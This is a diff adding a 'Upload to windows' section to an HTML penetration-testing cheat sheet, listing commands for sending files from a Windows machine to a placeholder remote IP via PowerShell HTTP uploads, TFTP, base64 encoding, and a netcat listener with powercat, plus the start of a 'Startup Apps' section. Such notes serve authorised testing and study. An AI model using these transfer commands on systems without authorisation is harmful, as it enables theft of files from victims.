@@ -617,8 +617,86 @@
         </tr>
     </table>
 
+    <li>Upload to windows</li>
+    <table>
+        <tr>
+            <td>Upload with Powershell</td>
+            <td>Invoke-RestMethod -Method PUT -Uri &quot;http://&lt;ip address&gt;:&lt;port&gt;/&lt;file name&gt;&quot; -Body $variable</td>
+        </tr>
+        <tr>
+            <td>Upload with Powershell</td>
+            <td>powershell (New-Object System.Net.WebClient).UploadFile('http://<ip address>/<file name>', '<file name>')</td>
+        </tr>
+        <tr>
+            <td>
+                <li>Upload to tftp</li>
+                <ul>
+                    <li>tftp is only on Windows until XP & 2003</li>
+                </ul>
+            </td>
+            <td>
+                <table>
+                    <tr>
+                        <td>Setup TFTP on Kali</td>
+                        <td>sudo apt install atftp</td>
+                    </tr>
+                    <tr>
+                        <td>Create tftp Directory</td>
+                        <td>sudo mkdir /tftp</td>
+                    </tr>
+                    <tr>
+                        <td>Set owner "nobody" on tftp Directory</td>
+                        <td>sudo chown nobody: /tftp</td>
+                    </tr>
+                    <tr>
+                        <td>Activate tftp server on port 69</td>
+                        <td>sudo atftpd --daemon --port 69 /tftp</td>
+                    </tr>
+                    <tr>
+                        <td>Upload file from Windows to Linux</td>
+                        <td>tftp -i <ip address> put file.txt</td>
+                    </tr>
+                </table>
+            </td>
+        </tr>
+        <tr>
+            <td>Base64 Encoding</td>
+            <td>
+                <table>
+                    <tr>
+                        <td>base64 w/ powershell</td>
+                        <td>
+                            <li>$fc = Get-Content &lt;file&gt;</li>
+                            <li>$fe = [System.Text.Encoding]::UTF8.GetBytes($fc)</li>
+                            <li>[System.Convert]::ToBase64String($fe)</li>
+                        </td>
+                    </tr>
+                    <tr>
+                        <td>Read file with Kali</td>
+                        <td>echo -n &lt;base64 text&gt; | base64 -d</td>
+                    </tr>
+                </table>
+            </td>
+        </tr>
+        <tr>
+            <td>Upload with powercat</td>
+            <td>
+                <table>
+                    <tr>
+                        <td>Set listener on receiving machine</td>
+                        <td>nc -lvnp &lt;port #&gt; &gt; receiving_file.ps1</td>
+                    </tr>
+                    <tr>
+                        <td>Send file with PowerCat</td>
+                        <td>powercat -c &lt;ip address&gt; -p  &lt;port #&gt; -i C:\&lt;Directory and file name&gt;</td>
+                    </tr>
+                </table>
+            </td>
+        </tr>
+    </table>
 
-
+<h2>Startup Apps</h2>
+<li>Program for startup apps that should start for all users (including admin):</li>
 
 
 </body>
